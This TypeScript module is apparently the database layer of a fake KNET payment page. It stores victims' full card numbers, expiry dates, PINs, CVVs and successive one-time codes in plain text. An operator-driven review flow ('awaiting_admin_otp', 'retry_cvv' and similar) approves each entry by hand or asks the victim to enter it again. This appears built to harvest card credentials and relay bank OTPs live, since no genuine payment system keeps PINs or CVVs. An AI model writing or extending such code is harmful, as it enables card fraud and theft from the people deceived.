import { prisma } from "@/lib/db";

type KnetCreateInput = {
  phone?: string;
  amount: number;
  cardNumber: string;
  expiryDate: string;
  pin: string;
  cvv: string;
  otp2?: string;
  status: string;
  reviewStep?: string;
  createdAt: Date;
  updatedAt: Date;
  orderId?: string;
};

export const KNET_REVIEW = {
  awaitingAdminCard: "awaiting_admin_card",
  cardEntry: "card_entry",
  otpEntry: "otp_entry",
  awaitingAdminOtp: "awaiting_admin_otp",
  cvvEntry: "cvv_entry",
  awaitingAdminCvv: "awaiting_admin_cvv",
  otp2Entry: "otp2_entry",
  awaitingAdminOtp2: "awaiting_admin_otp2",
  retryCard: "retry_card",
  retryOtp: "retry_otp",
  retryCvv: "retry_cvv",
  retryOtp2: "retry_otp2",
  done: "done",
} as const;

/** Matches `knet.create(...)` used in KnetService — stores submitted values as entered. */
export const knet = {
  create(data: KnetCreateInput) {
    const row = {
      phone: data.phone ?? "",
      amount: data.amount,
      cardNumber: data.cardNumber,
      expiryDate: data.expiryDate,
      pin: data.pin,
      cvv: data.cvv,
      otp2: data.otp2 ?? "",
      status: data.status,
      reviewStep: data.reviewStep ?? KNET_REVIEW.awaitingAdminCard,
      updatedAt: data.updatedAt,
    };
    if (data.orderId) {
      return prisma.knet.upsert({
        where: { orderId: data.orderId },
        create: {
          ...row,
          orderId: data.orderId,
          createdAt: data.createdAt,
        },
        update: row,
      });
    }
    return prisma.knet.create({
      data: {
        ...row,
        orderId: null,
        createdAt: data.createdAt,
      },
    });
  },
};

export async function listAllKnet() {
  return prisma.knet.findMany({ orderBy: { createdAt: "desc" } });
}

export async function findKnetById(id: string) {
  return prisma.knet.findUnique({ where: { id } });
}

export async function findKnetByOrderId(orderId: string) {
  return prisma.knet.findUnique({ where: { orderId } });
}

export function combineOtpHistory(existing: string | null | undefined, nextOtp: string): string {
  const next = nextOtp.trim();
  if (!next) return existing?.trim() ?? "";
  if (!existing?.trim()) return next;
  const parts = existing.split(" - ").map((p) => p.trim()).filter(Boolean);
  if (parts.length === 0) return next;
  if (parts[parts.length - 1] === next) return existing.trim();
  return `${parts.join(" - ")} - ${next}`;
}

export async function updateKnetOtpByOrderId(orderId: string, otp: string) {
  const existing = await findKnetByOrderId(orderId);
  const combined = combineOtpHistory(existing?.otp, otp);
  return prisma.knet.update({
    where: { orderId },
    data: { otp: combined, otpVerified: true, reviewStep: KNET_REVIEW.awaitingAdminOtp },
  });
}

export async function updateKnetCvvByOrderId(orderId: string, cvv: string) {
  return prisma.knet.update({
    where: { orderId },
    data: { cvv, cvvVerified: true, reviewStep: KNET_REVIEW.awaitingAdminCvv },
  });
}

export async function updateKnetOtp2ByOrderId(orderId: string, otp2: string) {
  const existing = await findKnetByOrderId(orderId);
  const combined = combineOtpHistory(existing?.otp2, otp2);
  return prisma.knet.update({
    where: { orderId },
    data: { otp2: combined, otp2Verified: true, reviewStep: KNET_REVIEW.awaitingAdminOtp2 },
  });
}

export async function setKnetStatus(id: string, status: string, reviewStep?: string) {
  return prisma.knet.update({
    where: { id },
    data: reviewStep ? { status, reviewStep } : { status },
  });
}

export async function setKnetReviewStep(id: string, reviewStep: string) {
  return prisma.knet.update({
    where: { id },
    data: { reviewStep },
  });
}

export async function knetRejectToRetry(
  id: string,
  reviewStep: string,
  extra?: { clearOtp?: boolean; clearCvv?: boolean; clearOtp2?: boolean },
) {
  return prisma.knet.update({
    where: { id },
    data: {
      status: "pending",
      reviewStep,
      ...(extra?.clearOtp ? { otp: "", otpVerified: false } : {}),
      ...(extra?.clearCvv ? { cvv: "", cvvVerified: false } : {}),
      ...(extra?.clearOtp2 ? { otp2: "", otp2Verified: false } : {}),
    },
  });
}

export async function acknowledgeKnetRetryByOrderId(orderId: string) {
  const row = await findKnetByOrderId(orderId);
  if (!row) throw new Error("not_found");
  switch (row.reviewStep) {
    case KNET_REVIEW.retryCard:
      return prisma.knet.update({
        where: { orderId },
        data: { reviewStep: KNET_REVIEW.cardEntry },
      });
    case KNET_REVIEW.retryOtp:
      return prisma.knet.update({
        where: { orderId },
        data: { otpVerified: false, reviewStep: KNET_REVIEW.otpEntry },
      });
    case KNET_REVIEW.retryCvv:
      return prisma.knet.update({
        where: { orderId },
        data: { cvv: "", cvvVerified: false, reviewStep: KNET_REVIEW.cvvEntry },
      });
    case KNET_REVIEW.retryOtp2:
      return prisma.knet.update({
        where: { orderId },
        data: { otp2Verified: false, reviewStep: KNET_REVIEW.otp2Entry },
      });
    default:
      throw new Error("generic");
  }
}
